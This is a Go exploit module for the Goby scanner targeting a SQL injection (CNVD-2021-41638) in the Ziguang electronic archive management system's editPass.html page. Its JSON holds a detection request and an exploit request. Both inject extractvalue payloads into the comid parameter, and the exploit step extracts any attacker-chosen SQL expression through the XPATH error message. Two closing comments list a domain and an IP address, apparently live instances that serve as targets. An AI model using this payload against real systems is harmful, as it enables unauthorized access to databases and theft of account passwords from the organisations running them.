package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Ziguang file management system editPass.html SQL (CNVD-2021-41638)",
    "Description": "<p>Ziguang electronic file management system is a management system that provides file information solutions for enterprises and institutions.</p><p>There is a SQL injection vulnerability in the Ziguang electronic file management system, and attackers can use the vulnerability to obtain sensitive information such as database account passwords.</p>",
    "Product": "Ziguang electronic file management system",
    "Homepage": "http://www.thams.com.cn/",
    "DisclosureDate": "2022-07-21",
    "Author": "abszse",
    "FofaQuery": "body=\"/Public/plugin/artDialog/jquery.artDialog.source.js\"",
    "GobyQuery": "body=\"/Public/plugin/artDialog/jquery.artDialog.source.js\"",
    "Level": "2",
    "Impact": "<p>There is a SQL injection vulnerability in the Ziguang electronic file management system, and attackers can use the vulnerability to obtain sensitive information such as database account passwords.</p>",
    "Recommendation": "<p>At present, the manufacturer has released patches, please pay attention to the official website update in time: <a href=\"http://www.thams.com.cn/\">http://www.thams.com.cn/</a></p>",
    "References": [
        "https://github.com/zhaodie/r00t_wiki/blob/b680ded35f5e0a8541d91f220aa4f1a973376003/docs/wiki/webapp/%E7%B4%AB%E5%85%89%E8%BD%AF%E4%BB%B6/%E7%B4%AB%E5%85%89%E6%A1%A3%E6%A1%88%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20editPass.html%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CNVD-2021-41638.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "user()",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/login/Login/editPass.html?comid=extractvalue(1,concat(char(126),md5(311)))",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "9dfcd5e558dfa04aaf37f137a1d9d3e",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "XPATH syntax error",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/login/Login/editPass.html?comid=extractvalue(1,concat(char(126),{{{cmd}}}))",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "XPATH syntax error:",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|XPATH syntax error: '(.*?)'"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [
        "CNVD-2021-41638"
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "紫光档案管理系统 editPass.html SQL注入漏洞 (CNVD-2021-41638)",
            "Product": "紫光电子档案管理系统",
            "Description": "<p>紫光电子档案管理系统是专为企事业单位提供档案信息化解决方案的管理系统。&nbsp;<br></p><p>紫光电子档案管理系统存在SQL注入漏洞，攻击者可利用漏洞获取数据库账号密码等敏感信息。<br></p>",
            "Recommendation": "<p>目前厂商已发布补丁，请及时关注官网更新：<a href=\"http://www.thams.com.cn/\">http://www.thams.com.cn/</a><br></p>",
            "Impact": "<p>紫光电子档案管理系统存在SQL注入漏洞，攻击者可利用漏洞获取数据库账号密码等敏感信息。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Ziguang file management system editPass.html SQL (CNVD-2021-41638)",
            "Product": "Ziguang electronic file management system",
            "Description": "<p>Ziguang electronic file management system is a management system that provides file information solutions for enterprises and institutions.<br></p><p>There is a SQL injection vulnerability in the Ziguang electronic file management system, and attackers can use the vulnerability to obtain sensitive information such as database account passwords.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released patches, please pay attention to the official website update in time: <a href=\"http://www.thams.com.cn/\">http://www.thams.com.cn/</a><br></p>",
            "Impact": "<p>There is a SQL injection vulnerability in the Ziguang electronic file management system, and attackers can use the vulnerability to obtain sensitive information such as database account passwords.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10694"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
//http://archive.yuzhou-group.com
//https://210.14.152.141